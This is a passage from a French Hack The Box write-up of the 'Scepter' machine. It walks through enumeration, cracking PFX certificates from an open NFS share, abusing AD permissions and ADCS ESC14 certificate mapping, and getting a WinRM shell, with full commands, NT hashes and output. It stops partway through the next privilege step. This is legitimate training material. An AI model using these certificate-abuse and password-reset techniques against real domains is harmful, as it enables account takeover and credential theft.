---
title: Scepter
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Hard", "Windows", "Active Directory", "ADCS", "ESC14"]
---

Scepter est une machine Windows de difficulté élevée qui commence par un partage NFS non authentifié, permettant à l'attaquant de télécharger un fichier de certificat PFX sensible. L'attaquant découvre ensuite que l'utilisateur compromis possède l'ACL `UserForceChangePassword`, permettant de changer le mot de passe du compte utilisateur `A.CARTER`. Ce compte utilisateur est membre du groupe IT SUPPORT, donnant aux membres du groupe l'ACL GenericAll sur l'unité organisationnelle (OU) `STAFF ACCESS CERTIFICATE`. L'attaquant peut alors contrôler entièrement tous les comptes utilisateurs sous cette OU. De plus, l'attaquant découvre que l'autorité de certification est vulnérable à `ESC14`, un mappage faible explicite. L'attaquant parvient à compromettre `H.BROWN` en modifiant l'attribut LDAP mail et en demandant le modèle de certificat `StaffAccessCertificate`. Le compte utilisateur `H.BROWN` est membre du groupe CMS, ayant les privilèges de modifier l'attribut LDAP `altSecurityIdentities` de tout objet AD sous l'OU `Helpdesk Enrollment Certificate`. Comme la CA est vulnérable à `ESC14`, l'attaquant peut modifier l'attribut LDAP (mappage fort, c'est-à-dire `X509IssuerSerialNumber`) et demander un certificat en tant que Domain Computer pour compromettre le compte utilisateur `P.ADAMS`, qui possède les privilèges `DCSync`, permettant à l'attaquant de compromettre le domaine. Une approche alternative consiste à exploiter le mappage faible `X509RFC822`, puis à s'inscrire au modèle de certificat en tant que compte utilisateur `D.BAKER` et à compromettre le compte utilisateur `P.ADAMS`.

## Enumération
### Nmap

Il y a 20 ports ouverts :
- 53 pour DNS
- 88 pour Kerberos
- 389 pour LDAP
- 445 pour SMB
- 636 pour LDAPS
- 2049 pour NFS
- 5986 pour WinRM
- Et d'autres ports Windows

```bash
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nmap 10.129.250.88 --min-rate 10000 -vv -p-
<snip>
Nmap scan report for 10.129.250.88
Host is up, received reset ttl 127 (0.12s latency).
Scanned at 2025-07-16 12:30:25 CEST for 61s
Not shown: 35048 filtered tcp ports (no-response), 30467 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2049/tcp  open  nfs              syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nmap 10.129.250.88 -p 53,88,111,135,139,389,445,593,636,2049,3268,3269,5986,9389,47001,49666,49667,49690,49691,49692 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-16 12:34 CEST
Nmap scan report for 10.129.250.88
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-16 18:34:23Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-07-16T18:35:26+00:00; +7h59m59s from scanner time.
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-07-16T18:35:25+00:00; +7h59m59s from scanner time.
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-07-16T18:35:28+00:00; +7h59m59s from scanner time.
3269/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-07-16T18:35:28+00:00; +7h59m59s from scanner time.
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-07-16T18:35:28+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T00:21:41
|_Not valid after:  2025-11-01T00:41:41
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time:
|   date: 2025-07-16T18:35:14
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

J'ajoute le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```bash
echo "10.129.250.88 scepter.htb dc01.scepter.htb dc01" | tee -a /etc/hosts
```

### DNS

L'énumération de tous les enregistrement DNS ne donne rien de vraiment intéressant. J'ai juste l'adresse IPV6 ainsi que le sous domaine `hostsmaster.scepter.htb`.
```bash
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ dig any "scepter.htb" @"10.129.250.88"

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any scepter.htb @10.129.250.88
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59901
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;scepter.htb.                   IN      ANY

;; ANSWER SECTION:
scepter.htb.            600     IN      A       10.129.250.88
scepter.htb.            3600    IN      NS      dc01.scepter.htb.
scepter.htb.            3600    IN      SOA     dc01.scepter.htb. hostmaster.scepter.htb. 133 900 600 86400 3600
scepter.htb.            600     IN      AAAA    dead:beef::58
scepter.htb.            600     IN      AAAA    dead:beef::118
scepter.htb.            600     IN      AAAA    dead:beef::6f58:6040:eaa5:3f32
scepter.htb.            600     IN      AAAA    dead:beef::67ef:37b5:7368:a056

;; ADDITIONAL SECTION:
dc01.scepter.htb.       1200    IN      A       10.129.250.88
dc01.scepter.htb.       1200    IN      AAAA    dead:beef::58
dc01.scepter.htb.       1200    IN      AAAA    dead:beef::67ef:37b5:7368:a056

;; Query time: 19 msec
;; SERVER: 10.129.250.88#53(10.129.250.88) (TCP)
;; WHEN: Wed Jul 16 12:41:57 CEST 2025
;; MSG SIZE  rcvd: 306

```

### SMB

Je ne peux énumérer aucun partages ni avec le compte `anonyme`, ni avec le compte `Guest`. Il en de même pour les utilisateurs.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nxc smb dc01.scepter.htb -u '' -p '' --shares

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nxc smb dc01.scepter.htb -u 'Guest' -p '' --shares
```

### NFS

Je vois un partage monté en NFS.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ showmount -e dc01.scepter.htb
Export list for dc01.scepter.htb:
/helpdesk (everyone)
```

Je le monte sur ma machine. S'y trouvent des clés et certificats d'utilisateurs du domaine. Il sont tous protégés par un mot de passe.
```bash
┌──(kali㉿kali)-[~/hackthebox/machines/Scepter]
└─$ sudo mount -t nfs dc01.scepter.htb:/helpdesk ./scepterNFS -o nolock                                                 
┌──(kali㉿kali)-[~/hackthebox/machines/Scepter]
└─$ su -
Password: 

┌──(root㉿kali)-[~]
└─# cd /cd /home/kali/hackthebox/machines/Scepter/scepterNFS                                                 
┌──(root㉿kali)-[/home/…/hackthebox/machines/Scepter/scepterNFS]
└─# ls -la
total 25
drwx------ 2 nobody nogroup   64 Nov  2  2024 .
drwxrwxr-x 3 kali   kali    4096 Jul 16 13:06 ..
-rwx------ 1 nobody nogroup 2484 Nov  2  2024 baker.crt
-rwx------ 1 nobody nogroup 2029 Nov  2  2024 baker.key
-rwx------ 1 nobody nogroup 3315 Nov  2  2024 clark.pfx
-rwx------ 1 nobody nogroup 3315 Nov  2  2024 lewis.pfx
-rwx------ 1 nobody nogroup 3315 Nov  2  2024 scott.pfx
```

Je crack dont les hash de ces fichiers et j'obtiens pour tous le mot de passe `newpassword`.
```bash
┌──(root㉿kali)-[/tmp/NFS]
└─# pfx2john lewis.pfx > ../lewis.hash  
                                                                                                                                       
┌──(root㉿kali)-[/tmp/NFS]
└─# pfx2john clark.pfx > ../clark.hash
                                                                                                                                       
┌──(root㉿kali)-[/tmp/NFS]
└─# pfx2john scott.pfx > ../scott.hash


┌──(root㉿kali)-[/tmp]
└─# johnjohn --wordlist=/usr/share/wordlists/rockyou.txt clark.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
newpassword      (clark.pfx)     
1g 0:00:00:00 DONE (2025-07-16 13:58) 9.090g/s 46545p/s 46545c/s 46545C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                       
┌──(root㉿kali)-[/tmp]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt lewis.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
newpassword      (lewis.pfx)     
1g 0:00:00:00 DONE (2025-07-16 13:58) 8.333g/s 42666p/s 42666c/s 42666C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                       
┌──(root㉿kali)-[/tmp]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt scott.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
newpassword      (scott.pfx)     
1g 0:00:00:00 DONE (2025-07-16 13:58) 8.333g/s 42666p/s 42666c/s 42666C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Connaissant le mot de passe, j'essais de me connecter avec les certificats de `lewis`, `scott` et `clark`, mais cela ne fonctionne pas. Je décide alors de forger alors un certificat pour utilisateur `baker`.
```bash
┌──(root㉿kali)-[/tmp/nfs]
└─# sudo openssl pkcs12 -export -out /tmp/baker.pfx -inkey baker.key -in baker.crt -passout pass:

Enter pass phrase for baker.key:
                                  
```

Une fois le certificat forgé, j'arrive à m'authentifier avec et j'obtiens alors le hash et un TGT de `d.baker`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ faketime "$(rdate -n dc01.scepter.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ certipy auth -pfx baker.pfx -dc-ip 10.129.250.88 -ns 10.129.250.88
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

Je génère alors le fichier `/etc/krb5.conf`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ export KRB5CCNAME=d.baker.ccache

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nxc smb dc01.scepter.htb -u 'd.baker' -k --generate-krb5-file /etc/krb5.conf
SMB         dc01.scepter.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
```

## Shell en tant que H.Brown
### Bloodhound

Je lance `bloodhound` pour obtenir les différentes relations entre les objets du domaine.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nxc ldap dc01.scepter.htb -u 'd.baker' -H '18b5fb0d99e7a475316213c15b6f22ce' --bloodhound -c All --dns-server 10.129.250.88
LDAP        10.129.250.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.129.250.88   389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce
LDAP        10.129.250.88   389    DC01             Resolved collection methods: acl, rdp, container, session, dcom, trusts, psremote, objectprops, localadmin, group
LDAP        10.129.250.88   389    DC01             Done in 00M 11S
LDAP        10.129.250.88   389    DC01             Compressing output into /root/.nxc/logs/DC01_10.129.250.88_2025-07-16_225508_bloodhound.zip
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ mv /root/.nxc/logs/DC01_10.129.250.88_2025-07-16_225508_bloodhound.zip .
```

`d.baker` peut changer le mot de passe de `A.Carter` qui est membre du groupe `IT Support`, possédant les droits `GenericAll` sur `Staff Access Certificate`. `d.baker` étant membre de `Staff Access Certificate`.
![](/images/Scepter/1.png)

Je vois qu'il n'y a que l'utilisateur `H.Brown` qui est membre du groupe `Remote Management Users`, donc le seul avec lequel je peux obtenir un shell.
![](/images/Scepter/2.png)

Donc le chemin d'attaque est tracé :
1. Changer le mot de passe de A.`Carter`
2. Octroyer à `A.Carter` les pleins droits sur `Staff Access Certificate`
3. Demander les certificats en tant que `d.baker`.
### Changer le mot de passe de A.Carter

Je change le mot de passe de `a.carter`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ bloodyAD --host 'dc01.scepter.htb' -u 'd.baker' -p ':18b5fb0d99e7a475316213c15b6f22ce' set password 'a.carter' 'Password@2025'
[+] Password changed successfully!

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ nxc smb dc01.scepter.htb -u 'a.carter' -p 'Password@2025'
SMB         10.129.250.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.129.250.88   445    DC01             [+] scepter.htb\a.carter:Password@2025
```

### GenericAll sur STAFF ACCESS CERTIFICATE

J'octroie tous les droits sur `STAFF ACCESS CERTIFICATE` à `a.carter`, ce qui lui permet de modifier aussi `d.baker`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ bloodyAD --host 'dc01.scepter.htb' -u 'a.carter' -p 'Password@2025' add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' a.carter
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

### Certipy

Apres avoir lancé `certipy` avec l'option `-vulnerable` pour énumérer les Templates vulnérables, le résultat me dis que le Template `StaffAccessCertificate` serait vulnérable à une ESC9. En regardant le `Certificate Name Flag`, je vois qu'une adresse mail est requise.
```bash
─root at exegol-hackthebox in /workspace/Scepter
╰─○ certipy find -u 'd.baker' -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target 'dc01.scepter.htb' -vulnerable -stdout -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.scepter.htb' at '8.8.8.8'
[+] Trying to resolve '' at '8.8.8.8'
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.129.250.88:636 - ssl
[+] Default path: DC=scepter,DC=htb
[+] Configuration path: CN=Configuration,DC=scepter,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SCEPTER.HTB\Authenticated Users (SCEPTER.HTB-S-1-5-11)
     SCEPTER.HTB\Everyone (SCEPTER.HTB-S-1-1-0)
     SCEPTER.HTB\Domain Computers (S-1-5-21-74879546-916818434-740295365-515)
     SCEPTER.HTB\d.baker (S-1-5-21-74879546-916818434-740295365-1106)
     SCEPTER.HTB\Domain Users (S-1-5-21-74879546-916818434-740295365-513)
     SCEPTER.HTB\Users (SCEPTER.HTB-S-1-5-32-545)
     SCEPTER.HTB\staff (S-1-5-21-74879546-916818434-740295365-1103)
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[+] Resolved 'dc01.scepter.htb' from cache: 10.129.250.88
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.129.250.88
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'dc01.scepter.htb' (10.129.250.88)
[*] Got CA configuration for 'scepter-DC01-CA'
[+] Resolved 'dc01.scepter.htb' from cache: 10.129.250.88
[+] Connecting to 10.129.250.88:80
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : scepter-DC01-CA
    DNS Name                            : dc01.scepter.htb
    Certificate Subject                 : CN=scepter-DC01-CA, DC=scepter, DC=htb
    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
    Certificate Validity End            : 2061-10-31 22:34:19+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SCEPTER.HTB\Administrators
      Access Rights
        ManageCertificates              : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        ManageCa                        : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        Enroll                          : SCEPTER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension
```

En regardant les propriétés de l'utilisateur `h.brown`, je vois `altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb`. Ce qui signifie qu'un certificat `X.509` est associé à l'utilisateur, avec l'email `h.brown@scepter.htb` comme identifiant.
```
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  nxc ldap dc01.scepter.htb -u 'd.baker' -H '18b5fb0d99e7a475316213c15b6f22ce' --query "(samAccountName=h.brown)" ""
<snip>
LDAP        10.129.181.228  389    DC01             accountExpires       0
LDAP        10.129.181.228  389    DC01             logonCount           3
LDAP        10.129.181.228  389    DC01             sAMAccountName       h.brown
LDAP        10.129.181.228  389    DC01             sAMAccountType       805306368
LDAP        10.129.181.228  389    DC01             userPrincipalName    h.brown@scepter.htb
LDAP        10.129.181.228  389    DC01             objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=scepter,DC=htb
LDAP        10.129.181.228  389    DC01             altSecurityIdentities X509:<RFC822>h.brown@scepter.htb
LDAP        10.129.181.228  389    DC01             dSCorePropagationData 20241101040716.0Z
LDAP        10.129.181.228  389    DC01                                  16010101000001.0Z
LDAP        10.129.181.228  389    DC01             lastLogonTimestamp   133748939536482133
LDAP        10.129.181.228  389    DC01             msDS-SupportedEncryptionTypes 0
```

Donc si je change l'email de `d.baker` en `h.brown@scepter.htb`, je pourrais demander un certificat en tant que `h.brown`. Ce qui ressemble au scénario d'une `ESC14`.

### Changer le mail de d.baker

Avec `bloodyAD`, je change l'email de `d.baker` en celui de `h.brown`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ bloodyAD --host 'dc01.scepter.htb' -u 'a.carter' -p 'Password@2025' set object d.baker mail -v 'h.brown@scepter.htb'
[+] d.baker's mail has been updated
```

### ESC14

Je demande ensuite un certificat en tant que `d.baker`
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ certipy req -username "d.baker@scepter.htb" -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'

```

En regardant les infos du certificat, je vois bien que l'adresse mail est `h.brown@scepter.htb`.
```
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  openssl pkcs12 -info -in d.baker.pfx                                                                                                   1 ↵
Enter Import Password:
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
PKCS7 Data
Certificate bag
Bag Attributes
    friendlyName:
    localKeyID: 59 6D 4D C1 72 D7 EB F4 D2 88 18 B5 95 1E 9B 14 B5 71 42 E1
subject=CN = d.baker, emailAddress = h.brown@scepter.htb
issuer=DC = htb, DC = scepter, CN = scepter-DC01-CA
```

Je peux donc m'authentifier en tant que `h.brown`, ce qui me donne son hash NTLM ainsi qu'un TGT.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ certipy auth -pfx d.baker.pfx -domain "scepter.htb" -username 'h.brown'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

L'authentification NTLM n'est pas possible avec `H.Brown`.
```
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ evil-winrm -i dc01.scepter.htb -u 'h.brown' -H '4ecf5242092c6fb8c360a08069c75a0c'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Donc j'exporte le TGT dans la variable `KRB5CCNAME` et je me connecte en utilisant l'authentification Kerberos.
```bash
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ export KRB5CCNAME=h.brown.ccache

╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ klist
Ticket cache: FILE:h.brown.ccache
Default principal: h.brown@SCEPTER.HTB

Valid starting       Expires              Service principal
07/17/2025 00:05:51  07/17/2025 04:05:51  krbtgt/SCEPTER.HTB@SCEPTER.HTB
        renew until 07/17/2025 04:05:51
        
╭─root at exegol-hackthebox in /workspace/Scepter
╰─○ evil-winrm -i dc01.scepter.htb -r scepter.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami
scepter\h.brown
*Evil-WinRM* PS C:\Users\h.brown\Documents> type ../Desktop/user.txt
831d0224f2939e312d1521c68b4b2051
```

## Shell en tant qu'administrateur
### Obtenir p.adams

`h.brown` est membre de plusieurs groupes.
![](/images/Scepter/Scepter-1.png)

`p.adams` est membre de `HELPDESK ENROLLMENT CERTIFICATE`. Il fait aussi parti du groupe `Replication` Operators qui peux `DCSync` le domaine.
![](/images/Scepter/3.png)

![](/images/Scepter/4.png)

En regardants les permissions sur `p.adams`, je vois que les membres du groupe CMS ont les droit d'écriture sur la propriété `altSecurityIdentities`. Cette même propriété qui nous a permis de faire l'`ESC14`.
```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> dsacls "CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB"
Owner: SCEPTER\Domain Admins
Group: SCEPTER\Domain Admins

Access list:
Allow SCEPTER\Domain Admins           FULL CONTROL
Allow BUILTIN\Account Operators       FULL CONTROL
<snip>
Allow SCEPTER\CMS                     SPECIAL ACCESS for altSecurityIdentities   <Inherited from parent>
                                      WRITE PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Account Restrictions   <Inherited from parent>
                                      READ PROPERTY
```

Maintenant en regardant les propriétés de `p.adams`, je vois qu'il n'a pas l'attribut `altSecurityIdentities`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  nxc ldap dc01.scepter.htb -u 'd.baker' -H '18b5fb0d99e7a475316213c15b6f22ce' --query "(samAccountName=p.adams)" ""
LDAP        10.129.181.228  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.129.181.228  389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce
LDAP        10.129.181.228  389    DC01             [+] Response for object: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
LDAP        10.129.181.228  389    DC01             objectClass          top
LDAP        10.129.181.228  389    DC01                                  person
LDAP        10.129.181.228  389    DC01                                  organizationalPerson
